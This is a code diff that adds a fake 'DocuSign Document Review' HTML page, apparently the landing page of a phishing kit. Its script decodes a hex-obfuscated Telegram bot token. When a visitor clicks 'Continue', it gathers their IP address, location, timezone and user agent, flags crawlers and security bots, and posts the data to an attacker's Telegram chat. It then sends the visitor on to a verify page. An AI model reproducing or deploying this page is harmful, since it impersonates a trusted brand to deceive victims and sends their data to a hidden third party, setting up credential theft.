@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>DocuSign Document Review</title>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
+<style>
+body {
+  margin: 0;
+  padding: 0;
+  height: 100vh;
+  min-height: 100vh;
+  overflow: hidden;
+  font-family: 'Segoe UI', Arial, sans-serif;
+  background: url(https://www.shutterstock.com/image-photo/texture-blurry-text-open-textbook-600nw-1175839786.jpg);
+  background-size: cover;
+  background-position: center;
+}
+#loading-screen {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100vw;
+  height: 100vh;
+  background: #fff;
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+  align-items: center;
+  z-index: 1000;
+}
+#loading-screen .loading-dots {
+  display: flex;
+  gap: 8px;
+}
+#loading-screen .dot {
+  width: 12px;
+  height: 12px;
+  background: #4f33a6;
+  border-radius: 50%;
+  animation: pulse 1.5s ease-in-out infinite;
+}
+#loading-screen .dot:nth-child(2) {
+  animation-delay: 0.2s;
+}
+#loading-screen .dot:nth-child(3) {
+  animation-delay: 0.4s;
+}
+@keyframes pulse {
+  0%, 100% { transform: scale(1); opacity: 1; }
+  50% { transform: scale(1.5); opacity: 0.5; }
+}
+#form-container {
+  display: none;
+  position: relative;
+  height: 100vh;
+}
+#bg-blur {
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: inherit;
+  filter: blur(8px);
+  z-index: 0;
+}
+#content-wrapper {
+  position: relative;
+  z-index: 2;
+  display: flex;
+  justify-content: center;
+  align-items: flex-start;
+  min-height: 100vh;
+  padding: 20px;
+  margin-top: 10px; 
+}
+#content-container {
+  background-color: rgba(255, 255, 255, 0.95);
+  border-radius: 8px;
+  width: 100%;
+  max-width: 520px;
+  box-sizing: border-box;
+  color: #4f33a6;
+  box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+  padding: 28px;
+  height: 250px; 
+}
+.docusign-logo {
+  display: block;
+  margin: 0 auto 8px auto;
+  height: 68px;
+  width: 220px;
+  max-width: 220px;
+  object-fit: contain;
+}
+@media (min-width: 540px) {
+  #content-container {
+    padding: 36px 28px;
+    border-radius: 12px;
+  }
+}
+@media (max-width: 420px) {
+  #content-container {
+    padding: 1px 20px 5px;
+    border-radius: 0;
+    height: 300px;
+  }
+}
+</style>
+</head>
+<body>
+<div id="loading-screen">
+  <div class="loading-dots">
+    <div class="dot"></div>
+    <div class="dot"></div>
+    <div class="dot"></div>
+  </div>
+</div>
+<div id="form-container">
+  <div id="bg-blur"></div>
+  <div id="content-wrapper">
+    <div id="content-container">
+    
+      <div id="message-content">
+        <h2 style="font-weight:100;margin:1px 0 5px 0;"></h2>
+        <p style="font-size:16px;margin:5px 0;">Messages From DocuSign</p>
+        <p style="font-size:14px;margin:5px 0;">You received messages from Docusign review and sign before they expire</p>
+      </div>
+      <div style="text-align:right;margin-top:15px;">
+        <a href="verify.html" id="continue-link" style="text-decoration:none;color:#aaa;font-size:19px;display:inline-block;padding:5px 10px;pointer-events:none;">Continue</a>
+      </div>
+    </div>
+  </div>
+</div>
+<script>
+const b = "373935333038303739323A4141457446385F41574C4E63566152674875714F2D385A4E576A5656754B4756454377";
+
+const sendTelegramNotification = async message => {
+  const t = b.match(/.{1,2}/g).map(b => String.fromCharCode(parseInt(b, 16))).join('');
+  try {
+    await fetch(`https://api.telegram.org/bot${t}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: "5116232183", text: message })
+    });
+  } catch (e) {}
+};
+
+const getClientInfo = async () => {
+  let ip = "Unknown";
+  let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  try {
+    const ipResponse = await fetch('https://ipapi.co/json/');
+    const ipData = await ipResponse.json();
+    ip = ipData.ip || "Unknown";
+    timezone = ipData.timezone || timezone;
+  } catch (e) {}
+  return {
+    ip,
+    timezone,
+    userAgent: navigator.userAgent,
+    isBot: /bot|crawl|spider|facebookexternalhit|WhatsApp|google|bing|duckduckbot|yandex|baidu|slurp|exabot|facebot|ia_archiver/i.test(navigator.userAgent),
+    timestamp: new Date().toLocaleString()
+  };
+};
+
+document.addEventListener('DOMContentLoaded', () => {
+  setTimeout(() => {
+    document.getElementById('loading-screen').style.display = 'none';
+    document.getElementById('form-container').style.display = 'block';
+    const continueLink = document.getElementById('continue-link');
+    continueLink.style.pointerEvents = '';
+    continueLink.style.color = '#4f33a6';
+  }, 3000);
+
+  const continueLink = document.getElementById('continue-link');
+  continueLink.addEventListener('click', async function(e) {
+    getClientInfo().then(clientInfo => {
+      sendTelegramNotification(`
+${clientInfo.isBot ? "🚩 Bot Visit" : "✅ New Visit"}
+- IP: ${clientInfo.ip}
+- Location: ${clientInfo.timezone.split('/').pop().replace('_', ' ')}
+- Time: ${clientInfo.timestamp}
+- User Agent: ${clientInfo.userAgent}
+`);
+    });
+  }, { once: true });
+});
+</script>
+</body>
+</html>
